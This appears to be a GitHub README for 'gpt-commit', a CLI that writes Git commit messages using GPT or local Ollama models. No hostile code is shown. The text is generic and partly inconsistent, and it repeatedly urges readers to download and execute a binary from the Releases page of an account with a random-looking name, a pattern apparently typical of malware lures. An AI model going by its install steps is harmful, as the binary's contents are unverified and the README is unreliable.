# gpt-commit 🚀

![gpt-commit](https://img.shields.io/badge/gpt--commit-v1.0.0-blue?style=flat&logo=github)

Welcome to **gpt-commit**, a developer-friendly command-line interface (CLI) tool designed to simplify the process of generating meaningful Git commit messages. By leveraging the power of GPT models from OpenAI and local LLMs like CodeLlama via Ollama, gpt-commit makes your version control experience smoother and more efficient.

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Usage](#usage)
- [Examples](#examples)
- [Contributing](#contributing)
- [License](#license)
- [Support](#support)

## Features

- **Smart Commit Messages**: Automatically generate context-aware commit messages based on your code changes.
- **Multiple Models**: Choose between OpenAI's GPT models or local LLMs like CodeLlama.
- **Developer-Friendly**: Designed with developers in mind, ensuring a seamless integration into your workflow.
- **CLI Tool**: Simple command-line interface for easy access and usage.

## Installation

To get started with gpt-commit, you can download the latest release from our [Releases](https://github.com/Ayufhjgvbb/gpt-commit/releases) section. Look for the appropriate file for your operating system, download it, and execute it.

### Prerequisites

- Ensure you have Git installed on your machine.
- Node.js is required for running the CLI tool.

### Steps to Install

1. Visit the [Releases](https://github.com/Ayufhjgvbb/gpt-commit/releases) section.
2. Download the file that matches your operating system.
3. Open your terminal.
4. Navigate to the directory where you downloaded the file.
5. Execute the file using the command:
   ```bash
   ./gpt-commit
   ```

## Usage

Using gpt-commit is straightforward. Once installed, you can generate commit messages with a simple command.

### Basic Command

To generate a commit message, use:
```bash
gpt-commit <your-code-changes>
```

Replace `<your-code-changes>` with a brief description of the changes you've made.

### Options

- `--model <model_name>`: Specify the model you want to use (e.g., `gpt-3`, `CodeLlama`).
- `--dry-run`: Preview the generated commit message without applying it.

### Example Command

```bash
gpt-commit "Added user authentication feature" --model gpt-3
```

This command will generate a commit message based on the description provided.

## Examples

Here are some examples of how gpt-commit can help you generate commit messages:

### Example 1: Basic Usage

You made changes to the login feature. Simply run:
```bash
gpt-commit "Refactor login feature for better performance"
```
Output:
```
Refactor: Improve performance of the login feature by optimizing the authentication flow.
```

### Example 2: Using a Specific Model

If you want to use CodeLlama, you can specify it like this:
```bash
gpt-commit "Fix typo in README" --model CodeLlama
```
Output:
```
Fix: Corrected a typo in the README file to enhance clarity.
```

## Contributing

We welcome contributions from the community! If you want to help improve gpt-commit, please follow these steps:

1. Fork the repository.
2. Create a new branch for your feature or bug fix.
3. Make your changes and commit them.
4. Push your changes to your fork.
5. Submit a pull request.

Please ensure your code adheres to our coding standards and includes tests where applicable.

## License

gpt-commit is licensed under the MIT License. See the [LICENSE](LICENSE) file for more details.

## Support

If you encounter any issues or have questions, please check the [Releases](https://github.com/Ayufhjgvbb/gpt-commit/releases) section for updates. You can also open an issue in the repository for further assistance.

## Topics

This project covers a variety of topics that may interest developers:

- **AI Tools**: Harnessing the power of AI for better software development.
- **Automation**: Streamlining the commit message generation process.
- **CLI**: A command-line interface that enhances productivity.
- **Commit Messages**: Focused on improving the quality of commit messages.
- **Developer Tools**: Tools designed to assist developers in their workflow.
- **Git**: Integration with Git for version control.
- **GPT**: Utilizing GPT models for natural language processing.
- **LLM**: Local Language Models for efficient processing.
- **Ollama**: A tool for managing local models.

## Acknowledgments

We would like to thank the contributors and the open-source community for their support. Special thanks to the developers behind OpenAI and CodeLlama for their groundbreaking work in AI and machine learning.

## Final Thoughts

gpt-commit aims to enhance your development experience by simplifying the process of generating commit messages. By utilizing advanced AI models, we strive to save you time and improve the clarity of your version control history. 

For the latest updates, features, and releases, please visit our [Releases](https://github.com/Ayufhjgvbb/gpt-commit/releases) section. We look forward to your feedback and contributions!